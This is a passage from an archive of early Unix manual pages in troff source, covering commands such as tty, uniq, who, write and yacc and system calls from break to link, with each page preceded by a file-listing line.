/tmp/rtm?	temporary
.br
/usr/lib/tmac.*	standard macro files
.br
.sh "SEE ALSO"
TROFF User's Manual (internal memorandum).
.br
TROFF Made Trivial (internal memorandum).
.br
nroff (I), eqn (I),
catsim (VI)
.sh BUGS
-- /usr/man/man1/tty.1 mode=0100664 uid=3 gid=3 atime=170022196 mtime=173061354 --
.th TTY I 3/15/72
.sh NAME
tty \*- get typewriter name
.sh SYNOPSIS
.bd tty
.sh DESCRIPTION
.it Tty
gives the name of the user's typewriter
in the form `tty\fIn\fR' for
\fIn\fR
a digit or letter.  The actual path
name is then `/dev/tty\fIn\fR'.
.sh DIAGNOSTICS
`not a tty' if the standard input file is not a typewriter.
.sh BUGS
-- /usr/man/man1/typo.1 mode=0100664 uid=3 gid=3 atime=170022198 mtime=173061354 --
.th TYPO I 5/15/74
.sh NAME
typo \*- find possible typos
.sh SYNOPSIS
.bd typo
[
.bd \*-1
] [
.bd \*-n
] file ...
.sh DESCRIPTION
.it Typo
hunts through a document for unusual
words, typographic errors, and
.it "hapax legomena"
and prints
them on the standard output.
.s3
The words used in the document are printed
out in decreasing order of peculiarity along
with an index of peculiarity.  An index of 10
or more is considered peculiar.  Printing of
certain very common English words is suppressed.
.s3
The statistics for judging words are taken from
the document itself, with some help from known
statistics of English.
The
.bd \*-n
option suppresses
the help from English and should be used if the
document is written in, for example, Urdu.
.s3
The
.bd \*-1
option causes the final output to appear in a single
column instead of three
columns.
The normal header and pagination is also suppressed.
.s3
Roff (I)
and
nroff (I)
control lines are ignored.
Upper case is mapped into lower case.
Quote marks, vertical bars, hyphens, and ampersands within words are 
equivalent to spaces.
Words hyphenated across lines are put back together.
.sh FILES
/tmp/ttmp??
.br
/usr/lib/salt
.br
/usr/lib/w2006
.sh BUGS
Because
of the mapping into lower case and the stripping
of special characters, words
may be hard to locate in the original text.
.s3
The escape sequences
of
troff (I)
are not correctly recognized.
-- /usr/man/man1/uniq.1 mode=0100664 uid=3 gid=3 atime=170022199 mtime=173061354 --
.th UNIQ I 12/1/72
.sh NAME
uniq \*- report repeated lines in a file
.sh SYNOPSIS
.bd uniq
[
.bd \*-udc
[ \fB+\fRn ] [ \fB\*-\fRn ]
] [ input [ output ] ]
.sh DESCRIPTION
.it Uniq
reads the input
file comparing adjacent lines.
In the normal case, the second and succeeding copies
of repeated lines are
removed; the remainder is written on the output file.
Note that repeated lines must be adjacent
in order to be found;
see sort(I).
If the
.bd \*-u
flag is used,
just the lines that are not repeated
in the original file are output.
The
.bd \*-d
option specifies that
one copy of just the repeated lines is to
be written.
The normal mode output is the union of the
.bd \*-u
and
.bd \*-d
mode outputs.
.s3
The
.bd \*-c
option supersedes
.bd \*-u
and
.bd \*-d
and generates
an output report in default style
but with each line preceded by a count of the
number of times it occurred.
.s3
The
.it n
arguments specify skipping an initial portion of each line
in the comparison:
.s3
.lp +8 4
\fB\*-\fIn\fR	The first \fIn\fR fields
together with any blanks before each are ignored.
A field is defined as a string of non-space, non-tab characters
separated by tabs and spaces from its neighbors.
.s3
.lp +8 4
\fB+\fIn\fR	The first \fIn\fR characters are ignored.
Fields are skipped before characters.
.i0
.s3
.sh "SEE ALSO"
sort (I), comm (I)
.sh BUGS
-- /usr/man/man1/wait.1 mode=0100664 uid=3 gid=3 atime=170022203 mtime=173061354 --
.th WAIT I 4/9/73
.sh NAME
wait \*- await completion of process
.sh SYNOPSIS
.bd wait
.sh DESCRIPTION
Wait until all processes started with
.bd &
have completed,
and report on abnormal terminations.
.s3
Because
.it "sys wait"
must be executed in the parent process,
the Shell itself executes
.it wait,
without creating a new process.
.sh "SEE ALSO"
sh (I)
.sh BUGS
After executing
.it wait
you are committed to waiting until
termination,
because interrupts and quits are ignored
by all processes concerned.
The only out, if the process does not terminate,
is to
.it kill
it from another terminal or to
hang up.
-- /usr/man/man1/wc.1 mode=0100664 uid=3 gid=3 atime=170022204 mtime=173061354 --
.th WC I 7/26/74
.sh NAME
wc \*- word count
.sh SYNOPSIS
.bd wc
[ name ... ]
.sh DESCRIPTION
.it Wc
counts lines and words in the named files,
or in the standard input if no name appears.
A word is a maximal string of printing characters
delimited by spaces, tabs or newlines.
All other characters are simply ignored.
.sh BUGS
-- /usr/man/man1/who.1 mode=0100664 uid=3 gid=3 atime=170022206 mtime=173061354 --
.th WHO I 3/15/72
.sh NAME
who  \*-  who is on the system
.sh SYNOPSIS
.bd who
[ who-file ] [
.bd "am I"
]
.sh DESCRIPTION
.it Who,
without an argument,
lists the name, typewriter channel, and login time
for each current UNIX user.
.s3
Without an argument,
.it who
examines the /etc/utmp
file to obtain its information.
If a file is given, that file is examined.
Typically the given file will be /usr/adm/wtmp,
which contains a record of all the logins since it
was created.
Then
.it who
lists
logins, logouts, and crashes since the creation of
the wtmp file.
Each login is listed with user name,
typewriter name (with `/dev/'
suppressed),
and date and time.
When an argument is given, logouts produce a similar line without a user name.
Reboots produce a line with `x' in the place of the device name,
and a fossil time indicative of when the system went down.
.s3
With two arguments,
.it who
behaves as if it had no arguments except for restricting
the printout to the line for the current typewriter.
Thus `who am I' (and also `who are you')
tells you who you are logged in as.
.sh FILES
/etc/utmp
.sh "SEE ALSO"
login (I), init (VIII)
.sh BUGS
-- /usr/man/man1/write.1 mode=0100664 uid=3 gid=3 atime=170022207 mtime=173061354 --
.th WRITE I 8/5/73
.sh NAME
write  \*-  write to another user
.sh SYNOPSIS
.bd write
user [ ttyno ]
.sh DESCRIPTION
.it Write
copies lines from your typewriter to that of
another user.
When first called,
it sends the message
.s3
     message from yourname...
.s3
The recipient of the message should write back at this point.
Communication continues until an end of file is
read from the typewriter or an interrupt is sent.
At that point
.it write
writes `EOT' on the other terminal and exits.
.s3
If you want to write to a user who is logged in more than once,
the
.it ttyno
argument may be used to indicate the last character
of the appropriate typewriter name.
.s3
Permission to write may be denied or granted by use of the
.it mesg
command.
At the outset writing is allowed.
Certain commands, in particular
.it roff
and
.it pr,
disallow
messages in order to prevent messy output.
.s3
If the character `!' is found at the beginning of a line,
.it write
calls the shell
to execute the rest of the
line as a command.
.s3
The following protocol is suggested for using
.it write:
when you first write to another user, wait for him to
write back before starting to send.
Each party should end each message with a distinctive
signal
(
.bd (o)
for `over' is conventional) that the other may reply.
.bd (oo)
(for `over and out') is suggested when conversation
is about to be terminated.
.sh FILES
/etc/utmp	to find user
.br
/bin/sh	to execute `!'
.sh "SEE ALSO"
mesg (I), who (I), mail (I)
.sh BUGS
-- /usr/man/man1/yacc.1 mode=0100664 uid=3 gid=3 atime=170022209 mtime=173061355 --
.th YACC I 11/25/74
.sh NAME
yacc \*- yet another compiler-compiler
.sh SYNOPSIS
.bd yacc
[
.bd \*-vor
]
[ grammar ]
.sh DESCRIPTION
.it Yacc
converts a context-free grammar into a set of
tables for a simple automaton which executes an LR(1) parsing
algorithm.
The grammar may be ambiguous;
specified precedence rules are used to break ambiguities.
.s3
The output is
.it y.tab.c,
which must be compiled by the C compiler
and loaded with any other routines
required (perhaps a lexical analyzer) and the Yacc library:
.s3
	cc y.tab.c other.o \*-ly
.s3
If the
.bd \*-v
flag is given, the file
.it y.output
is prepared, which contains a description of the parsing tables
and a report on
conflicts generated by ambiguities in the grammar.
.s3
The
.bd \*-o
flag calls an optimizer for the tables;
the optimized tables, with parser included, appear on file
.it y.tab.c
.s3
The
.bd \*-r
flag causes Yacc to accept grammars with Ratfor actions,
and produce Ratfor output on
.it y.tab.r;
.bd \*-r
implies the
.bd \*-o
flag.
Typical usage is then
.s3
	rc y.tab.r other.o
.s3
.sh "SEE ALSO"
``LR Parsing'', by A. V. Aho and S. C. Johnson,
Computing Surveys, June, 1974.
``The YACC Compiler-compiler'', internal memorandum.
.sh AUTHOR
S. C. Johnson
.sh FILES
y.output
.br
y.tab.c
.br
y.tab.r			when ratfor output is obtained
.br
yacc.tmp		when optimizer is called
.br
/lib/liby.a		runtime library for compiler
.br
/usr/yacc/fpar.r	ratfor parser
.br
/usr/yacc/opar.c	parser for optimized tables
.br
/usr/yacc/yopti		optimizer postpass
.sh DIAGNOSTICS
The number of reduce-reduce and shift-reduce conflicts
is reported on the standard output;
a more detailed report is
found in the
.it y.output
file.
.sh BUGS
Because file names are fixed, at most one Yacc
process can be active in a given directory at
a time.
-- /usr/man/man2 mode=0140775 uid=3 gid=3 atime=173061443 mtime=173059709 --
-- /usr/man/man2/break.2 mode=0100664 uid=3 gid=3 atime=170022213 mtime=173061360 --
.th BREAK II 8/5/73
.sh NAME
break, brk, sbrk \*- change core allocation
.sh SYNOPSIS
(break = 17.)
.br
.ft B
sys break; addr
.s3
char *brk(addr)
.s3
char *sbrk(incr)
.ft R
.sh DESCRIPTION
.it Break
sets the system's idea of the lowest location not used by the program
(called the break)
to
.it addr
(rounded up to the next multiple of 64 bytes).
Locations not less than
.it addr
and below the stack pointer
are not in the address space and will thus
cause a memory violation if accessed.
.s3
From C,
.it brk
will set the break to
.it addr.
The old break is returned.
.s3
In the alternate entry
.it sbrk,
.it incr
more bytes are added to the
program's data space and a pointer to the
start of the new area is returned.
.s3
When a program begins execution via
.it exec
the break is set at the
highest location defined by the program
and data storage areas.
Ordinarily, therefore, only programs with growing
data areas need to use
.it break.
.sh "SEE ALSO"
exec (II), alloc (III), end (III)
.sh DIAGNOSTICS
The c-bit is set if the program requests more
memory than the system limit
or if more than 8 segmentation
registers would be required to implement the break.
From C, \*-1 is returned for these errors.
.sh BUGS
Setting the break in the range
0177700 to 0177777 is the same as setting it to zero.
-- /usr/man/man2/chdir.2 mode=0100664 uid=3 gid=3 atime=170022213 mtime=173061360 --
.th CHDIR II 8/5/73
.sh NAME
chdir \*- change working directory
.sh SYNOPSIS
(chdir = 12.)
.br
.ft B
sys chdir; dirname
.s3
chdir(dirname)
.br
char *dirname;
.ft R
.sh DESCRIPTION
.it Dirname
is the address of the pathname of a directory, terminated by a null byte.
.it Chdir
causes this directory
to become the current working directory.
.sh "SEE ALSO"
chdir (I)
.sh DIAGNOSTICS
The error bit (c-bit)
is set if the given name is not that of a directory
or is not readable.
From C, a \*-1 returned value indicates an error,
0 indicates success.
-- /usr/man/man2/chmod.2 mode=0100664 uid=3 gid=3 atime=170022214 mtime=173061360 --
.th CHMOD II 12/15/74
.sh NAME
chmod \*- change mode of file
.sh SYNOPSIS
(chmod = 15.)
.br
.ft B
sys chmod; name; mode
.s3
chmod(name, mode)
.br
char *name;
.ft R
.sh DESCRIPTION
The file whose name
is given as the null-terminated string pointed to by
.it name
has its mode changed to
.it mode.
Modes are constructed by ORing together some
combination of the following:
.s3
.in +3
 4000 set user ID on execution
 2000 set group ID on execution
 1000 save text image after execution
 0400 read by owner
 0200 write by owner
 0100 execute (search on directory) by owner
 0070 read, write, execute (search) by group
 0007 read, write, execute (search) by others
.in -3
.s3
Only the owner of a file (or the super-user) may change the mode.
Only the super-user can set the 1000 mode.
.sh "SEE ALSO"
chmod (I)
.sh DIAGNOSTIC
Error bit
(c-bit) set if
.it name
cannot be found or if current user
is neither the owner of the file nor the super-user.
From C, a \*-1 returned value indicates an
error, 0 indicates success.
-- /usr/man/man2/chown.2 mode=0100664 uid=3 gid=3 atime=170022215 mtime=173061360 --
.th CHOWN II 12/15/74
.sh NAME
chown \*- change owner and group of a file
.sh SYNOPSIS
(chmod = 16.)
.br
.ft B
sys chown; name; owner
.s3
chown(name, owner)
.br
char *name;
.ft R
.sh DESCRIPTION
The file
whose name is given by the null-terminated string pointed
to by
.it name
has its owner and group changed to
the low and high bytes of
.it owner
respectively.
Only the super-user may
execute this call,
because if users were able to give files away,
they could defeat the (nonexistent)
file-space accounting procedures.
.sh "SEE ALSO"
chown (VIII), chgrp (VIII), passwd (V)
.sh DIAGNOSTICS
The error bit (c-bit) is set
on illegal owner changes.
From C a \*-1 returned value indicates error,
0 indicates success.
-- /usr/man/man2/close.2 mode=0100664 uid=3 gid=3 atime=170022215 mtime=173061360 --
.th CLOSE II 8/5/73
.sh NAME
close  \*-  close a file
.sh SYNOPSIS
(close = 6.)
.br
(file descriptor in r0)
.br
.ft B
sys close
.s3
close(fildes)
.s3
.ft R
.sh DESCRIPTION
Given
a file descriptor such as returned from an
.it open,
.it creat,
or
.it pipe
call,
.it close
closes the associated file.
A close of all files is automatic on
.it exit,
but since
processes are limited to 15 simultaneously open files,
.it close
is necessary for programs which deal with many files.
.sh "SEE ALSO"
creat (II), open (II), pipe (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set for an unknown file descriptor.
From C a \*-1 indicates an error, 0 indicates
success.
-- /usr/man/man2/creat.2 mode=0100664 uid=3 gid=3 atime=170022216 mtime=173061360 --
.th CREAT II 8/5/73
.sh NAME
creat  \*-  create a new file
.sh SYNOPSIS
(creat = 8.)
.br
.ft B
sys creat; name; mode
.br
.ft R
(file descriptor in r0)
.ft B
.s3
creat(name, mode)
.br
char *name;
.ft R
.sh DESCRIPTION
.it Creat
creates a new file or prepares to rewrite an existing
file called 
.it name,
given as the address of a null-terminated string.
If the file did not exist, it is given
mode
.it mode.
See
.it chmod
(II) for the
construction of the
.it mode
argument.
.s3
If the file did exist, its mode and owner remain unchanged
but it is truncated to 0 length.
.s3
The file is also opened for writing, and its file descriptor
is returned (in r0).
.s3
The
.it mode
given is arbitrary; it need not allow
writing.
This feature is used by programs which deal with temporary
files of fixed names.
The creation is done with
a mode that forbids writing.
Then if a second
instance of the program attempts a
.it creat,
an error is
returned and the program knows that the name is unusable
for the moment.
.sh "SEE ALSO"
write (II), close (II), stat (II)
.sh DIAGNOSTICS
The error bit
(c-bit) may be set if: a needed directory is not searchable;
the file does not exist and the directory
in which it is to be created is not writable; the file
does exist and is unwritable;
the file is a directory;
there are already too many files open.
.s3
From C, a \*-1 return indicates an error.
-- /usr/man/man2/csw.2 mode=0100664 uid=3 gid=3 atime=170022216 mtime=173061360 --
.th CSW II 8/5/73
.sh NAME
csw \*- read console switches
.sh SYNOPSIS
(csw = 38.; not in assembler)
.br
.ft B
sys	csw
.s3
getcsw( )
.ft R
.sh DESCRIPTION
The setting of
the console switches is returned (in r0).
-- /usr/man/man2/dup.2 mode=0100664 uid=3 gid=3 atime=170022217 mtime=173061360 --
.th DUP II 8/5/73
.sh NAME
dup \*- duplicate an open file descriptor
.sh SYNOPSIS
(dup = 41.; not in assembler)
.br
(file descriptor in r0)
.br
.ft B
sys dup
.s3
dup(fildes)
.br
int fildes;
.ft R
.sh DESCRIPTION
Given
a file descriptor returned from
an
.it open,
.it pipe,
or
.it creat
call,
.it dup
will allocate another file descriptor
synonymous
with
the original.
The new file descriptor is returned in r0.
.s3
.it Dup
is used more to reassign the value
of file descriptors
than to genuinely
duplicate a file descriptor.
Since the algorithm to allocate
file descriptors
returns the
lowest available
value,
combinations of
.it dup
and
.it close
can be
used to
manipulate file descriptors
in a general way.
This is handy for
manipulating standard input and/or
standard output.
.sh "SEE ALSO"
creat (II), open (II), close (II), pipe (II)
.sh DIAGNOSTICS
The
error bit (c-bit)
is set if:
the given file descriptor is invalid;
there are already too many open files.
From C, a \*-1 returned value indicates an error.
-- /usr/man/man2/exec.2 mode=0100664 uid=3 gid=3 atime=170022218 mtime=173061360 --
.th EXEC II 8/5/73
.sh NAME
exec, execl, execv  \*-  execute a file
.sh SYNOPSIS
(exec = 11.)
.br
.ft B
sys exec; name; args
.br
.li
...
.br
name: <...\\0>
.br
.li
...
.br
args: arg0; arg1; ...; 0
.br
arg0: <...\\0>
.br
arg1: <...\\0>
.br
   ...
.s3
execl(name, arg0, arg1, ..., argn, 0)
.br
char *name, *arg0, *arg1, ..., *argn;
.s3
execv(name, argv)
.br
char *name;
.br
char *argv[ ];
.ft R
.sh DESCRIPTION
.it Exec
overlays the calling process with the named file, then
transfers to the
beginning of the core image of the file.
There can be no return from the file; the calling
core image is lost.
.s3
Files remain open across
.it exec
calls.
Ignored signals remain ignored across
.it exec,
but
signals that are caught are reset
to their default values.
.s3
Each user has a
.it real
user ID and group ID and an
.it effective
user ID and group ID.
The
real
ID
identifies the person using the system;
the
effective
ID
determines his access privileges.
.it Exec
changes the effective user and group ID to
the owner of the executed file if the file has the ``set-user-ID''
or ``set-group-ID''
modes.
The
real
user ID is not affected.
.s3
The form of this call differs somewhat depending
on whether it is called from assembly language or C;
see below for the C version.
.s3
The first argument to
.it exec
is a pointer to the name of the file
to be executed.
The second is the address of a null-terminated list of pointers to
arguments to be passed to the file.
Conventionally, the first argument is the name of the
file.
Each pointer addresses a string terminated by a null byte.
.s3
Once the called file starts execution, the arguments are available
as follows.
The stack pointer points to a word containing the number of arguments.
Just above
this number is a list of pointers to the argument strings.
The arguments are placed as high as possible in core.
.s3
  sp\*>	nargs
.br
	arg0
.br
	...
.br
	argn
.br
	\*-1
.s3
 arg0:	<arg0\\0>
.br
	...
.br
 argn:	<argn\\0>
.s3
From C, two interfaces are available.
.it execl
is useful when a known file with known arguments is
being called;
the arguments to
.it execl
are the character strings
constituting the file and the arguments; as in
the basic call, the first argument is conventionally
the same as the file name (or its last component).
A 0 argument must end the argument list.
.s3
The
.it execv
version is useful when the number of arguments is unknown
in advance;
the arguments to
.it execv
are the name of the file to be
executed and a vector of strings containing
the arguments.
The last argument string must be followed
by a 0 pointer.
.s3
When a C program is executed,
it is called as follows:
.s3
	main(argc, argv)
.br
	int argc;
.br
	char **argv;
.s3
where \fIargc\fR is the argument count
and \fIargv\fR is an array of character pointers
to the arguments themselves.
As indicated, \fIargc\fR is conventionally at least one
and the first member of the array points to a
string containing the name of the file.
.s3
.it Argv
is not directly usable in another
.it execv,
since
.it argv[argc]
is \*-1 and not 0.
.sh "SEE ALSO"
fork (II)
.sh DIAGNOSTICS
If the file cannot be found,
if it is not executable,
if it does not have a valid header (407, 410, or 411 octal as first word),
if maximum memory is exceeded,
or if the arguments require more than 512 bytes
a return from
.it exec
constitutes the diagnostic;
the error bit (c-bit) is set.
Even for the super-user,
at least one of the execute-permission bits must be set for
a file to be executed.
From C the returned value is \*-1.
.sh BUGS
Only 512 characters of arguments are allowed.
-- /usr/man/man2/exit.2 mode=0100664 uid=3 gid=3 atime=170022218 mtime=173061360 --
.th EXIT II 8/5/73
.sh NAME
exit \*- terminate process
.s3
.sh SYNOPSIS
(exit = 1.)
.br
(status in r0)
.br
.ft B
sys exit
.s3
exit(status)
.br
int status;
.ft R
.sh DESCRIPTION
.it Exit
is the normal means of terminating a process.
.it Exit
closes all the process's files and notifies the parent process
if it is executing a
.it wait.
The low byte of r0
(resp. the argument to
\fIexit\fR)
is available as status to the parent process.
.s3
This call can never return.
.sh "SEE ALSO"
wait (II)
.sh DIAGNOSTICS
None.
-- /usr/man/man2/fork.2 mode=0100664 uid=3 gid=3 atime=170022219 mtime=173061360 --
.th FORK II 8/5/73
.sh NAME
fork  \*-  spawn new process
.sh SYNOPSIS
(fork = 2.)
.br
.ft B
sys fork
.br
.ft R
(new process return)
.br
(old process return)
.s3
.ft B
fork( )
.ft R
.sh DESCRIPTION
.it Fork
is the only way new processes are created.
The new process's core image is a copy of
that of the caller of
.it fork.
The only distinction
is the return location and the fact
that r0 in the old (parent) process contains the process ID
of the new (child) process.
This process ID is used by
.it wait.
.s3
The two returning processes share all open
files that existed before the call.
In particular,
this is the way that standard input and output
files are passed and also how
pipes are set up.
.s3
From C, the child process receives a 0 return,
and the parent receives a non-zero number which is the process ID
of the child;
a return of \*-1 indicates inability
to create a new process.
.sh "SEE ALSO"
wait (II), exec (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set in the old process if a new process
could not be created because of lack of process space.
From C, a return of \*-1 (not just negative)
indicates an error.
-- /usr/man/man2/fstat.2 mode=0100664 uid=3 gid=3 atime=170022219 mtime=173061360 --
.th FSTAT II 8/5/73
.sh NAME
fstat  \*-  get status of open file
.s3
.sh SYNOPSIS
(fstat = 28.)
.br
(file descriptor in r0)
.ft B
.br
sys fstat; buf
.s3
fstat(fildes, buf)
.br
struct inode *buf;
.ft R
.sh DESCRIPTION
This
call is identical to
.it stat,
except that it operates
on open files instead of files given by name.
It is most often used to get the status
of the standard input and output files, whose names
are unknown.
.sh "SEE ALSO"
stat (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set if the file descriptor is unknown;
from C, a \*-1 return indicates an error, 0 indicates success.
-- /usr/man/man2/getgid.2 mode=0100664 uid=3 gid=3 atime=170022220 mtime=173061361 --
.th GETGID II 5/15/74
.sh NAME
getgid  \*-  get group identifications
.sh SYNOPSIS
(getgid = 47.; not in assembler)
.br
.ft B
sys getgid
.ft B
.s3
getgid( )
.ft R
.sh DESCRIPTION
.it Getgid
returns a word (in r0),
the low byte of which contains
the real group ID of
the current process.
The high byte contains the effective group ID
of the current process.
The real group ID identifies the group of the person who is logged in,
in contradistinction to the effective group ID, which
determines his access permission at the moment.
It is thus useful to programs which operate using
the ``set group ID'' mode, to find out who invoked them.
.sh "SEE ALSO"
setgid (II)
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/getpid.2 mode=0100664 uid=3 gid=3 atime=170022221 mtime=173061361 --
.th GETPID II 2/8/75
.sh NAME
getpid  \*-  get process identification
.sh SYNOPSIS
(getpid = 20.; not in assembler)
.br
.ft B
sys getpid
.ft R
.br
(pid in r0)
.ft B
.s3
getpid( )
.ft R
.sh DESCRIPTION
.it Getpid
returns
the process ID of
the current process.
Most often it is used to generate
uniquely-named
temporary files.
.sh "SEE ALSO"
\*-
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/getuid.2 mode=0100664 uid=3 gid=3 atime=170022221 mtime=173061361 --
.th GETUID II 5/15/74
.sh NAME
getuid  \*-  get user identifications
.sh SYNOPSIS
(getuid = 24.)
.br
.ft B
sys getuid
.ft B
.s3
getuid( )
.ft R
.sh DESCRIPTION
.it Getuid
returns a word (in r0),
the low byte of which contains
the real user ID of
the current process.
The high byte contains the effective user ID
of the current process.
The real user ID identifies the person who is logged in,
in contradistinction to the effective user ID, which
determines his access permission at the moment.
It is thus useful to programs which operate using
the ``set user ID'' mode, to find out who invoked them.
.sh "SEE ALSO"
setuid (II)
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/gtty.2 mode=0100664 uid=3 gid=3 atime=170022222 mtime=173061361 --
.th GTTY II 8/5/73
.sh NAME
gtty  \*-  get typewriter status
.sh SYNOPSIS
(gtty = 32.)
.br
(file descriptor in r0)
.ft B
.br
sys gtty; arg
.br
.li
...
.br
arg: .=.+6
.s3
gtty(fildes, arg)
.br
int arg[3];
.ft R
.sh DESCRIPTION
.it Gtty
stores in the three words addressed by
.it arg
the status
of the typewriter whose file descriptor is given in r0
(resp. given as the first argument).
The format is the same as that passed by
.it stty.
.sh "SEE ALSO"
stty (II)
.sh DIAGNOSTICS
Error bit
(c-bit) is set if the file descriptor does not refer
to a typewriter.
From C, a \*-1 value is returned for an
error, 0, for a successful call.
-- /usr/man/man2/indir.2 mode=0100664 uid=3 gid=3 atime=170022223 mtime=173061361 --
.th INDIR II 8/5/73
.sh NAME
indir \*- indirect system call
.sh SYNOPSIS
(indir = 0.; not in assembler)
.br
.ft B
sys indir; syscall
.ft R
.sh DESCRIPTION
The system call at the location
.it syscall
is executed.
Execution resumes after the
.it indir
call.
.s3
The main purpose of
.it indir
is to allow a program to
store arguments in system calls and execute them
out of line in the data segment.
This preserves the purity of the text segment.
.s3
If
.it indir
is executed indirectly,
it is a no-op.
If the instruction at the indirect
location is not a system call,
the executing process will get a fault.
.sh "SEE ALSO"
\*-
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/intro.2 mode=0110664 uid=3 gid=3 atime=170022225 mtime=173061361 --
.th INTRO II 11/5/73
.de pg
.sp
..
.de en
.pg
.in 3
.ti 0
\\$1\t\\$2\t\\$3
.br
..
.sp 2
.in 0
.if t .ta 3  10
.ce
INTRODUCTION TO SYSTEM CALLS
.sp
Section II of this manual
lists all the entries into the system.
In most cases two calling sequences are specified,
one of which is usable from assembly language, and the other from C.
Most of these calls have an error return.
From assembly language an erroneous call is always
indicated by turning on the c-bit of the condition codes.
The presence of an error is most easily tested
by the instructions
.it bes
and
.it bec
(``branch on error set (or clear)'').
These are synonyms for
the
.it bcs
and
.it bcc
instructions.
.pg
From C, an error condition is indicated by an otherwise
impossible returned value.
Almost always this is \(mi1;
the individual sections specify the details.
.pg
In both cases an error number is also available.
In assembly language,
this number is returned in r0 on erroneous calls.
From C,
the external variable
.it errno
is set to the error number.
.it Errno
is not cleared on successful calls, so it should be tested only
after an error has occurred.
There is a table of messages
associated with each error, and a routine for printing the
message.
See
.it "perror (III)."
.pg
The possible error numbers
are not recited with each writeup in section II, since many
errors are possible for most of the calls.
Here is a list of the error numbers,
their names inside the system (for the benefit of
system-readers),
and the messages available using
.it perror.
A short explanation is also provided.
.en 0 \(mi (unused)
.en 1 EPERM "Not owner and not super-user"
Typically this error indicates
an attempt to modify a file in some way forbidden
except to its owner.
It is also returned for attempts
by ordinary users to do things
allowed only to the super-user.
.en 2 ENOENT "No such file or directory"
This error occurs when a file name is specified
and the file should exist but doesn't, or when one
of the directories in a path name does not exist.
.en 3 ESRCH "No such process"
The process whose number was given to
.it signal
does not exist, or is already dead.
.en 4 EINTR "Interrupted system call"
An asynchronous signal (such as interrupt or quit),
which the user has elected to catch,
occurred during a system call.
If execution is resumed
after processing the signal,
it will appear as if the interrupted system call
returned this error condition.
.en 5 EIO "I/O error"
Some physical I/O error occurred during a
.it read
or
.it write.
This error may in some cases occur
on a call following the one to which it actually applies.
.en 6 ENXIO "No such device or address"
I/O on a special file refers to a subdevice which does not
exist,
or beyond the limits of the device.
It may also occur when, for example, a tape drive
is not dialled in or no disk pack is loaded on a drive.
.en 7 E2BIG "Arg list too long"
An argument list longer than 512 bytes
(counting the null at the end of each argument)
is presented to
.it exec.
.en 8 ENOEXEC "Exec format error"
A request is made to execute a file
which, although it has the appropriate permissions,
does not start with one of the magic numbers
407 or 410.
.en 9 EBADF "Bad file number"
Either a file descriptor refers to no
open file,
or a read (resp. write) request is made to
a file which is open only for writing (resp. reading).
.en 10 ECHILD "No children"
.it Wait
and the process has no
living or unwaited-for children.
.en 11 EAGAIN "No more processes"
In a
.it fork,
the system's process table is full and no
more processes can for the moment be created.
.en 12 ENOMEM "Not enough core"
During an
.it exec
or
.it break,
a program asks for more core than the system is able to supply.
This is not a temporary condition; the maximum core size
is a system parameter.
The error may also occur if the arrangement
of text, data, and stack segments is such as to
require more than the existing 8 segmentation registers.
.en 13 EACCES "Permission denied"
An attempt was made to access a file in a way forbidden
by the protection system.
.en 14 \(mi (unused)
.en 15 ENOTBLK "Block device required"
A plain file was mentioned where a block device was required,
e.g. in
.it mount.
.en 16 EBUSY "Mount device busy"
An attempt to mount a device that was already mounted or
an attempt was made to dismount a device
on which there is an open file or some process's current
directory.
.en 17 EEXIST "File exists"
An existing file was mentioned in an inappropriate context,
e.g.
.it link.
.en 18 EXDEV "Cross-device link"
A link to a file on another device
was attempted.
.en 19 ENODEV "No such device"
An attempt was made to apply an inappropriate
system call to a device;
e.g. read a write-only device.
.en 20 ENOTDIR "Not a directory"
A non-directory was specified where a directory
is required,
for example in a path name or
as an argument to
.it chdir.
.en 21 EISDIR "Is a directory"
An attempt to write on a directory.
.en 22 EINVAL "Invalid argument"
Some invalid argument:
currently, dismounting a non-mounted
device,
mentioning an unknown signal in
.it signal,
and giving an unknown request in
.it stty
to the TIU special file.
.en 23 ENFILE "File table overflow"
The system's table of open files is full,
and temporarily no more
.it opens
can be accepted.
.en 24 EMFILE "Too many open files"
Only 15 files can be open per process.
.en 25 ENOTTY "Not a typewriter"
The file mentioned in
.it stty
or
.it gtty
is not a typewriter or one of the other
devices to which these calls apply.
.en 26 ETXTBSY "Text file busy"
An attempt to execute a pure-procedure
program which is currently open for writing
(or reading!).
Also an attempt to open for writing a pure-procedure
program that is being executed.
.en 27 EFBIG "File too large"
An attempt to make a file larger than the maximum of 32768 blocks.
.en 28 ENOSPC "No space left on device"
During a
.it write
to an ordinary file,
there is no free space left on the device.
.en 29 ESPIPE "Seek on pipe"
A
.it seek
was issued to a pipe.
This error should also be issued for
other non-seekable devices.
.en 30 EROFS "Read-only file system"
An attempt to modify a file or directory
was made
on a device mounted read-only.
.en 31 EMLINK "Too many links"
An attempt to make more than 127 links to a file.
.en 32 EPIPE "Write on broken pipe"
A write on a pipe for which there is no process
to read the data.
This condition normally generates a signal;
the error is returned if the signal is ignored.
-- /usr/man/man2/kill.2 mode=0100664 uid=3 gid=3 atime=170022228 mtime=173061361 --
.th KILL II 12/15/74
.sh NAME
kill  \*-  send signal to a process
.sh SYNOPSIS
(kill = 37.; not in assembler)
.br
(process number in r0)
.br
.ft B
sys kill; sig
.s3
kill(pid, sig);
.ft R
.sh DESCRIPTION
.it Kill
sends the signal
.it sig
to the process specified by the
process number in r0.
See signal (II) for a list of signals.
.s3
The sending and receiving processes must
have the same effective user ID, otherwise
this call is restricted to the super-user.
.s3
If the process number is 0,
the signal is sent to all other processes which have the
same controlling typewriter and user ID.
.s3
In no case is it possible for a process to kill itself.
.sh "SEE ALSO"
signal (II), kill (I)
.sh DIAGNOSTICS
The error bit (c-bit)
is set if the process does not
have the same effective user ID and the
user is not super-user, or if the process
does not exist.
From C, \-1 is returned.
-- /usr/man/man2/link.2 mode=0100664 uid=3 gid=3 atime=170022229 mtime=173061361 --
.th LINK II 8/5/73
.sh NAME
link \*- link to a file
.sh SYNOPSIS
(link = 9.)
.br
.ft B
sys link; name1; name2
.s3
link(name1, name2)
.br
char *name1, *name2;
.ft R
.sh DESCRIPTION
A link
to
.it name1
is created;
the link has the name
.it name2.
Either name may be an arbitrary path name.
.sh "SEE ALSO"
link (I), unlink (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set when
.it name1
cannot be found; when
.it name2
already exists; when the directory of
.it name2
cannot be written; when
